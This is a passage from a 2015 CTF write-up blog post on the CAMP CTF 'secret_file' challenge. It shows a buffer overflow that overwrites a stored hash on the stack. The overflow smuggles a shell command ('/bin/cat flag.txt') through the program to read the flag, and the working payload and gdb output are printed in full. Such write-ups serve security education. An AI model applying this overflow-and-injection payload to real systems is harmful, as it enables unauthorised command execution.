+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'>
+</span><span class='line'><span class="o">=</span>&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
+</span><span class='line'>   0x555555554bda:    mov    r12d,eax
+</span><span class='line'>   0x555555554bdd:    <span class="nb">test   </span>eax,eax
+</span><span class='line'>   0x555555554bdf:    jne    0x555555554c40
+</span><span class='line'>   0x555555554be1:    lea    rdi,<span class="o">[</span>r13+0x100<span class="o">]</span>
+</span><span class='line'>Guessed arguments:
+</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe2ab <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">65</span> <span class="nb">times</span>&gt;<span class="s2">&quot;\340, u\362\365\034\255#\320Sq\206\317\315P\371\021\352\225O\234.2\244\067\364S&#39;\361\267\211\233\273e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&quot;</span><span class="o">)</span>
+</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x7fffffffe30c <span class="o">(</span><span class="s2">&quot;e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&quot;</span><span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;ve overwritten part of the hash on the stack, yet the hash of our input stayed the same. After some trial &amp; error, I could reliably overwrite the hash:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/secret_file<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&#39;</span> <span class="p">|</span> ./secret_file
+</span><span class='line'>sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What&rsquo;s left now is to exploit it to grab the flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc challs.campctf.ccc.ac 10105
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat flag.txt       <span class="p">;</span> <span class="c">#e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb</span>
+</span><span class='line'>CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-08-18T21:35:08+02:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:35 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/buffer/'>buffer</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/hash/'>hash</a>, <a class='category' href='/blog/categories/overflow/'>overflow</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/08/18/camp-ctf-hacker-level/" title="Previous Post: CAMP CTF - Hacker_Level">&laquo; CAMP CTF - Hacker_Level</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/08/18/camp-ctf-ropcalc/" title="Next Post: CAMP CTF - ropcalc">CAMP CTF - ropcalc &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-dkm/">CAMP CTF - Dkm</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-ropcalc/">CAMP CTF - Ropcalc</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-secret-file/">CAMP CTF - Secret_File</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-hacker-level/">CAMP CTF - Hacker_Level</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/18/camp-ctf-bitterman-and-phobos/">CAMP CTF - Bitterman &amp; Phobos</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
